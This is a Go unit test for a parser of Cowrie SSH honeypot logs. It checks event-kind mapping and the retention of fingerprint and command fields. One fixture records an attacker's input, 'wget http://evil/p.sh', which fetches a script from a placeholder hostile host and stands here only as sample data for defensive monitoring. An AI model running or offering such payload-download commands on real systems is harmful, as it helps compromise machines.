package cowrie

import "testing"

func TestToEventCommand(t *testing.T) {
	rec := cowrieLine{
		EventID:    "cowrie.command.input",
		Timestamp:  "2026-05-21T12:00:00.000000Z",
		SrcIP:      "1.2.3.4",
		SrcPort:    4242,
		Username:   "root",
		Session:    "abc",
		Input:      "wget http://evil/p.sh",
		HASSH:      "hassh-123",
		SSHVersion: "SSH-2.0-libssh",
	}
	e, ok := toEvent(rec, `{"eventid":"cowrie.command.input"}`)
	if !ok {
		t.Fatalf("expected event to parse")
	}
	if e.Kind != "command" {
		t.Fatalf("expected command kind, got %s", e.Kind)
	}
	if e.HASSH != "hassh-123" {
		t.Fatalf("expected hassh, got %q", e.HASSH)
	}
	if e.Command == "" {
		t.Fatalf("expected command text")
	}
}

func TestMapKindTunnel(t *testing.T) {
	k, ok := mapKind("cowrie.direct-tcpip.request")
	if !ok {
		t.Fatalf("expected tunnel kind")
	}
	if k != "tunnel" {
		t.Fatalf("expected tunnel, got %s", k)
	}
}
